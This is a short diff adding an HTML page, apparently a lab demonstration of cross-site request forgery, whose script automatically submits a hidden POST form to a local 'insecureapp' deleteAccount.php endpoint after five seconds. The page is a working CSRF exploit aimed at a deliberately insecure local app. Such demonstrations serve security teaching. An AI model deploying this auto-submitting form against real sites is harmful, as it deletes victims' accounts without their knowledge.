@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Malacious Website</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+    </head>
+    <body>
+        <div class="container mt-5">
+            <div class="alert alert-warning">Visiting this site while logged in with insecure app will delete your profile</div>
+            <form 
+                action="http://localhost/insecureapp/deleteAccount.php"
+                method="post"
+                target="_blank"
+            >
+            </form>
+        </div>
+    </body>
+    <script>
+        setTimeout(() => {
+            document.forms[0].submit();
+        }, 5000)
+    </script>
+</html>
